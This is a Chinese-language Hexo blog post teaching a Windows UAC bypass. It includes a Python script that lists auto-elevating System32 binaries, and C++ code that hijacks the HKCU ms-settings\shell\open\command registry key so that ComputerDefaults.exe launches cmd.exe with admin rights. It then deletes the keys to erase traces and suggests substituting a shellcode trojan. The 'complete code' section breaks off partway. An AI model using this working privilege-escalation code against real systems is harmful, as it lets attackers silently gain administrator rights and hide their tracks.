@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 6.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap"></h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2023-10-22T08:51:11.601Z" itemprop="datePublished">2023-10-22</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-08-25T18:09:52.000Z" itemprop="dateUpdated">2023-08-26</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h1><p>UAC，全称为User Account Control（用户账户控制），是Windows Vista及后续版本中的一个安全组件。它的设计目的是防止潜在的破坏性操作——特别是那些可能对系统配置产生影响的操作——在不经过管理员授权的情况下执行。</p>
+<p>UAC通过在执行可能需要管理员权限的任务时弹出提示窗口，要求用户确认操作或者输入管理员账户的密码，从而实现对可能的危险行为的监控和控制。这个特性使得恶意软件在未经用户许可的情况下更难以在系统中执行危险的操作，提高了系统的安全性</p>
+<p>8</p>
+<p>在Visual Studio中，你可以通过修改项目的manifest文件来配置User Account Control（用户账户控制，UAC）设置。这个文件是一个XML文件，它定义了应用程序的配置属性，其中一个属性就是UAC设置</p>
+<ul>
+<li><code>asInvoker</code>：这是默认值。当这个值被设置时，应用程序会以启动它的用户的权限运行。如果应用程序被普通用户启动，它将会以普通权限运行；如果应用程序被管理员启动，它将以管理员权限运行。</li>
+<li><code>highestAvailable</code>：当这个值被设置时，应用程序会尽可能地获取最高权限。如果应用程序被管理员启动，它将会以管理员权限运行；如果应用程序被普通用户启动，它将以普通权限运行。</li>
+<li><code>requireAdministrator</code>：当这个值被设置时，应用程序总是以管理员权限运行。如果应用程序被普通用户启动，UAC会弹出一个对话框，要求用户输入管理员账户的密码</li>
+</ul>
+<img src="uac白名单挖掘/image-20230622121843399.png" alt="image-20230622121843399" style="zoom:67%;" />	
+
+
+
+<h1 id="Uac白名单挖掘"><a href="#Uac白名单挖掘" class="headerlink" title="Uac白名单挖掘"></a>Uac白名单挖掘</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>UAC（User Account Control）白名单挖掘是一种常见的权限提升技术，其基本思想是寻找可以在无UAC提示的情况下以管理员权限运行的应用程序。许多这样的程序会对其启动参数进行不够严格的检查，使得攻击者可以通过在启动参数中包含恶意代码，来使得这些程序在启动的同时执行这些恶意代码，从而实现权限提升</p>
+<p>特别地，由于Windows中的许多设置应用程序（例如<code>ComputerDefaults.exe</code>、<code>fodhelper.exe</code>等）在设计时需要考虑到在UAC开启的情况下仍能正常工作，所以它们在manifest文件中常常会设置<code>autoElevate</code>为<code>true</code>，这意味着这些应用程序会在启动时自动提升至管理员权限，而且不会出现UAC提示</p>
+<p>攻击者可能会尝试修改某些注册表键（例如<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>）来劫持这些协议处理程序，以使得当这些应用程序被启动时，他们指定的恶意代码也会被以管理员权限执行，从而实现权限提升。因此，这些键值是UAC白名单挖掘的常见目标</p>
+<h2 id="所需工具"><a href="#所需工具" class="headerlink" title="所需工具"></a>所需工具</h2><ul>
+<li><strong>Sigcheck</strong>工具是一个由Sysinternals提供的命令行实用程序，用于对Windows二进制文件（如.exe，.dll，.sys等）进行签名验证，并显示文件版本信息，证书链等。其下载地址: <a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/Sigcheck">https://download.sysinternals.com/files/Sigcheck</a></li>
+<li><strong>Process Monitor</strong> 是由 Windows Sysinternals 提供的一款高级监视工具，它可以实时监控 Windows 文件系统、注册表和进程&#x2F;线程活动。其下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">https://docs.microsoft.com/en-us/sysinternals/downloads/procmon</a></li>
+</ul>
+<h2 id="白名单的筛选条件"><a href="#白名单的筛选条件" class="headerlink" title="白名单的筛选条件"></a>白名单的筛选条件</h2><p>我们正在寻找满足以下几个条件的白名单程序：</p>
+<ul>
+<li>程序的 manifest 文件中的 autoElevate 属性必须配置为 true，这允许程序在无需用户干预的情况下自动获取提升的权限。</li>
+<li>程序执行时不能弹出 UAC（用户账户控制）对话框，这确保了程序的无缝执行，不会因 UAC 对话框的出现而中断用户的工作流。</li>
+<li>程序需要能够查询注册表中的 <code>Shell\Open\command</code> 键。这是因为 <code>shell\open\command</code> 键值通常用于存储特定类型的可执行程序文件路径。当这种特定类型的程序运行时，系统会在注册表中查找并执行对应的 <code>shell\open\command</code> 键值中指定的程序。这一属性允许我们通过改变该键值中的程序路径，将我们所需的程序插入到某些特定的系统操作中</li>
+</ul>
+<h2 id="挖掘步骤"><a href="#挖掘步骤" class="headerlink" title="挖掘步骤"></a>挖掘步骤</h2><h3 id="1-autoElevate值为true"><a href="#1-autoElevate值为true" class="headerlink" title="1.autoElevate值为true"></a>1.<code>autoElevate</code>值为true</h3><p>使用sigcheck工具查看可执行程序的相关信息，如下图所示可以看到名为<code>autoElevate</code>的标签，当其被设置为true时，它表示该应用程序在启动时会自动请求和获取管理员权限，前提是当前的用户账户有管理员权限</p>
+<blockquote>
+<p>Sigcheck工具的-m选项用于显示二进制文件的描绘符。一个描绘符是一个可执行文件或DLL的XML文件，其中包含有关应用程序的信息。这些信息可以包括应用程序的名称，它的版本，它需要的特权等等</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\sigcheck64.exe -m C:\windows\system32\ComputerDefaults.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622164747889.png" alt="image-20230622164747889"></p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165311813.png" alt="image-20230622165311813"></p>
+<p>根据以上思路，我们可以使用以下python代码来筛选出可用的白名单程序。此脚本首先获取 <code>C:\\Windows\\System32</code> 目录及其子目录下所有 <code>.exe</code> 文件，然后对每个 <code>.exe</code> 文件检查其是否具有 <code>autoElevate</code> 属性，如果有则将文件名写入到 <code>success.txt</code> 文件中</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="function"><span class="keyword">import</span> subprocess</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">get_exe_files</span><span class="params">(path)</span>:</span></span><br><span class="line"><span class="function">    exe_files =</span> []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files in os.<span class="built_in">walk</span>(path):</span><br><span class="line">        <span class="keyword">for</span> file in files:</span><br><span class="line">            <span class="keyword">if</span> os.path.<span class="built_in">splitext</span>(file)[<span class="number">1</span>] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">                exe_files.<span class="built_in">append</span>(os.path.<span class="built_in">join</span>(root, file))</span><br><span class="line">    <span class="keyword">return</span> exe_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">check_auto_elevate</span>(exe_files):</span><br><span class="line">    success_files = []</span><br><span class="line">    <span class="keyword">for</span> file in exe_files:</span><br><span class="line">        command = r<span class="number">&#x27;.</span>\sigcheck64.exe -m &#123;&#125; | findstr <span class="keyword">auto</span><span class="number">&#x27;.f</span>ormat(file)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = subprocess.<span class="built_in">run</span>(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> in result.stdout.<span class="built_in">decode</span>(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;&#x27;</span>.format(file))</span><br><span class="line">                success_files.<span class="built_in">append</span>(file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Error when processing file &#123;&#125;: &#123;&#125;&#x27;</span>.format(file, <span class="built_in">str</span>(e)))</span><br><span class="line">    <span class="keyword">return</span> success_files</span><br><span class="line"></span><br><span class="line">def <span class="built_in">main</span>():</span><br><span class="line">    path = <span class="string">&#x27;C:\\Windows\\System32&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Getting .exe files in &#123;&#125;...&#x27;</span>.format(path))</span><br><span class="line">    exe_files = <span class="built_in">get_exe_files</span>(path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Checking auto elevate property for each file...&#x27;</span>)</span><br><span class="line">    success_files = <span class="built_in">check_auto_elevate</span>(exe_files)</span><br><span class="line">    with <span class="built_in">open</span>(<span class="string">&#x27;WhiteList.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">        <span class="keyword">for</span> file in success_files:</span><br><span class="line">            f.<span class="built_in">write</span>(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.format(file))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Done. Found &#123;&#125; files with auto elevate property.&#x27;</span>.format(<span class="built_in">len</span>(success_files)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行上述python代码后，会在其目录下生成一个WhiteList.txt文本文件，用于存放白名单程序的绝对路径，其文本内容如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\bthudtask.exe</span><br><span class="line">C:\Windows\System32\changepk.exe</span><br><span class="line">C:\Windows\System32\ComputerDefaults.exe</span><br><span class="line">C:\Windows\System32\dccw.exe</span><br><span class="line">C:\Windows\System32\dcomcnfg.exe</span><br><span class="line">C:\Windows\System32\DeviceEject.exe</span><br><span class="line">C:\Windows\System32\DeviceProperties.exe</span><br><span class="line">C:\Windows\System32\djoin.exe</span><br><span class="line">C:\Windows\System32\easinvoker.exe</span><br><span class="line">C:\Windows\System32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">C:\Windows\System32\eudcedit.exe</span><br><span class="line">C:\Windows\System32\eventvwr.exe</span><br><span class="line">C:\Windows\System32\fodhelper.exe</span><br><span class="line">C:\Windows\System32\fsquirt.exe</span><br><span class="line">C:\Windows\System32\FXSUNATD.exe</span><br><span class="line">C:\Windows\System32\immersivetpmvscmgrsvr.exe</span><br><span class="line">C:\Windows\System32\iscsicli.exe</span><br><span class="line">C:\Windows\System32\iscsicpl.exe</span><br><span class="line">C:\Windows\System32\lpksetup.exe</span><br><span class="line">C:\Windows\System32\MSchedExe.exe</span><br><span class="line">C:\Windows\System32\msconfig.exe</span><br><span class="line">C:\Windows\System32\msra.exe</span><br><span class="line">C:\Windows\System32\MultiDigiMon.exe</span><br><span class="line">C:\Windows\System32\newdev.exe</span><br><span class="line">C:\Windows\System32\odbcad32.exe</span><br><span class="line">C:\Windows\System32\PasswordOnWakeSettingFlyout.exe</span><br><span class="line">C:\Windows\System32\recdisc.exe</span><br><span class="line">C:\Windows\System32\rrinstaller.exe</span><br><span class="line">C:\Windows\System32\shrpubw.exe</span><br><span class="line">C:\Windows\System32\slui.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesAdvanced.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesComputerName.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesDataExecutionPrevention.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesHardware.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesPerformance.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesProtection.exe</span><br><span class="line">C:\Windows\System32\SystemPropertiesRemote.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsAdminFlows.exe</span><br><span class="line">C:\Windows\System32\SystemSettingsRemoveDevice.exe</span><br><span class="line">C:\Windows\System32\Taskmgr.exe</span><br><span class="line">C:\Windows\System32\tcmsetup.exe</span><br><span class="line">C:\Windows\System32\TpmInit.exe</span><br><span class="line">C:\Windows\System32\WindowsUpdateElevatedInstaller.exe</span><br><span class="line">C:\Windows\System32\WSReset.exe</span><br><span class="line">C:\Windows\System32\wusa.exe</span><br><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里还需注意一点，有个别程序会弹出uac框的，例如changepk.exe，这个程序在windows11不会弹uac，但是在windows10会弹uac</p>
+<img src="uac白名单挖掘/image-20230623183142614.png" alt="image-20230623183142614" style="zoom:67%;" />	
+
+
+
+<h3 id="2-调用Shell-Open-command键"><a href="#2-调用Shell-Open-command键" class="headerlink" title="2.调用Shell\Open\command键"></a>2.调用<code>Shell\Open\command</code>键</h3><p>打开ProcessMonitor捕捉ComputerDefaults.exe的运行信息，在Filter工具栏设置<code>Process Name</code>为<code>ComputerDefaults.exe</code>，<code>Result</code>设置为<code>NAME NOT FOUND</code></p>
+<img src="uac白名单挖掘/image-20230622165530035.png" alt="image-20230622165530035" style="zoom:67%;" />	
+
+<img src="uac白名单挖掘/image-20230622165809092.png" alt="image-20230622165809092" style="zoom:67%;" />	
+
+
+
+<p>随后运行ComputerDeafaults，ProcessMonitor立马会显示关于此程序的相关信息</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622165919733.png" alt="image-20230622165919733"></p>
+<p>​			</p>
+<p>注意此路径<code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>, 这行的操作是<code>RegQueryKey</code>，表示查询注册表的一个键</p>
+<blockquote>
+<p>在注册表中，键相当于目录，它们可以包含其他键（相当于子目录）或键值（相当于文件）。一个键通常不直接包含数据，数据是存储在键值中的</p>
+</blockquote>
+<img src="uac白名单挖掘/image-20230622194233641.png" alt="image-20230622194233641" style="zoom:67%;" />	
+
+
+
+<p>打开注册表，新建上述的键<code>ms-settings\Shell\Open\command</code></p>
+<img src="uac白名单挖掘/image-20230622195409277.png" alt="image-20230622195409277" style="zoom:67%;" />	
+
+
+
+<p>再用ProcessMonitor捕捉ComputerDefaults的信息，发现它还会去查询<code>DelegateExecute</code>键值，操作为<code>RegQueryValue</code>，表示查询注册表的键值</p>
+<blockquote>
+<p>在注册表中，键值是存储实际数据的地方，例如，可以在一个键值中存储一个字符串、一个数字或一个二进制数据</p>
+</blockquote>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622200928739.png" alt="image-20230622200928739"></p>
+<p>在注册表对应的键中添加个键值为<code>DelegateExecute</code>，并将此目录的默认键值设为<code>cmd.exe</code></p>
+<blockquote>
+<p>Windows注册表中，每个键下面都有一个被称为“默认”或“(默认)”的键值。你可以将其视为该键的默认数据。当你访问一个键而不指定键值的名称时，将返回此默认键值的数据</p>
+</blockquote>
+<img src="uac白名单挖掘/image-20230622201650750.png" alt="image-20230622201650750" style="zoom:67%;" />	
+
+
+
+<p>再次运行ComputerDefaults，会弹出系统管理员权限的cmd，也就是说如果我们将cmd.exe替换成shellcode木马的路径，那么就能获得管理员权限的shell</p>
+<p><img src="/uac%E7%99%BD%E5%90%8D%E5%8D%95%E6%8C%96%E6%8E%98/image-20230622202206176.png" alt="image-20230622202206176"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由此我们可以总结，在执行ComputerDefaults.exe程序之前，系统会首先检查注册表路径<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>是否存在。如果存在，系统将继续搜索同一目录下是否存在DelegateExecute键值对。</p>
+<p>只有在这两个条件都满足的情况下，系统才会执行由<code>HKCU:\Software\Classes\ms-settings\shell\open\command</code>路径所指向的exe文件	</p>
+<p>还有一点，为何要找HKCU(HKEY_CURRENT_USER)目录下的键值对呢？因为HKCU下的注册表键值不需要管理员权限。HKCU 包含当前登录用户配置信息，每个用户都有其自己的 HKCU，其中的设置可以被用户自由修改，通常不需要额外的管理员权限</p>
+<h1 id="bypass的实现"><a href="#bypass的实现" class="headerlink" title="bypass的实现"></a>bypass的实现</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-创建新键"><a href="#1-创建新键" class="headerlink" title="1.创建新键"></a>1.创建新键</h3><p>在 <code>HKEY_CURRENT_USER\Software\Classes</code> 注册表路径下创建一个名为 <code>ms-settings\shell\open\command</code> 的新键（如果该键已存在则打开它）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建或打开注册表键</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, subKey, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to create or open registry key\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-创建键值"><a href="#2-创建键值" class="headerlink" title="2.创建键值"></a>2.创建键值</h3><p>在刚刚创建的键下，创建一个名为 <code>DelegateExecute</code> 的键值，并将其设置为空字符串</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加 &quot;DelegateExecute&quot; 键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>)) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-设置键的默认键值"><a href="#3-设置键的默认键值" class="headerlink" title="3.设置键的默认键值"></a>3.设置键的默认键值</h3><p>设置 <code>ms-settings\shell\open\command</code> 键的默认键值为 <code>filename</code> 变量，这里是 <code>&quot;cmd.exe&quot;</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置默认键值为 &quot;calc.exe&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RegSetValueEx</span>(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE*)filename, <span class="built_in">strlen</span>(filename) + <span class="number">1</span>) != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Unable to set default registry value\n&quot;</span>;</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-启动进程"><a href="#4-启动进程" class="headerlink" title="4.启动进程"></a>4.启动进程</h3><p>使用 <code>CreateProcess</code> 函数启动新的进程来执行 <code>&quot;C://windows//system32//cmd.exe&quot;</code> 这个命令，命令参数是 <code>/c C://windows//system32//computerdefaults.exe</code>。当这个命令执行时，它实际上会通过 <code>ms-settings\shell\open\command</code> 注册表键执行 <code>cmd.exe</code>，因为此键的默认键值被设置为 <code>cmd.exe</code>。这个过程就是用户账户控制（UAC）的绕过</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si;  <span class="comment">//进程启动信息</span></span><br><span class="line">	PROCESS_INFORMATION pi;  <span class="comment">//进程信息</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(si));  <span class="comment">//将结构体si的所有成员都初始化为0</span></span><br><span class="line">	<span class="built_in">ZeroMemory</span>(&amp;pi, <span class="built_in">sizeof</span>(pi));  <span class="comment">//将结构体pi的所有成员都初始化为0</span></span><br><span class="line">	si.cb = <span class="built_in">sizeof</span>(si);  <span class="comment">//结构体大小</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CreateProcess</span>(</span><br><span class="line">		<span class="string">&quot;C://windows//system32//cmd.exe&quot;</span>,  <span class="comment">//要执行的应用程序名称（包含路径）</span></span><br><span class="line">		(LPSTR)<span class="string">&quot;/c C://windows//system32//computerdefaults.exe&quot;</span>,  <span class="comment">//命令行参数</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//进程句柄不可被继承</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//线程句柄不可被继承</span></span><br><span class="line">		FALSE,  <span class="comment">//不继承句柄</span></span><br><span class="line">		<span class="number">0</span>,  <span class="comment">//标志位为0</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的环境变量</span></span><br><span class="line">		<span class="literal">NULL</span>,  <span class="comment">//使用父进程的工作目录</span></span><br><span class="line">		&amp;si,  <span class="comment">//传递启动信息</span></span><br><span class="line">		&amp;pi)  <span class="comment">//传递进程信息</span></span><br><span class="line">		) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateProcess failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());  <span class="comment">//打印错误信息</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//释放进程句柄和线程句柄</span></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-清理痕迹"><a href="#5-清理痕迹" class="headerlink" title="5.清理痕迹"></a>5.清理痕迹</h3><p>为了清理痕迹，程序等待一段时间后删除 <code>HKEY_CURRENT_USER\Software\Classes\ms-settings</code> 键，删除所有刚刚创建的键和键值</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除整个ms-settings目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">RegDeleteTree</span>(HKEY_CURRENT_USER,<span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>) != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;RegDeleteTree Error:%d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 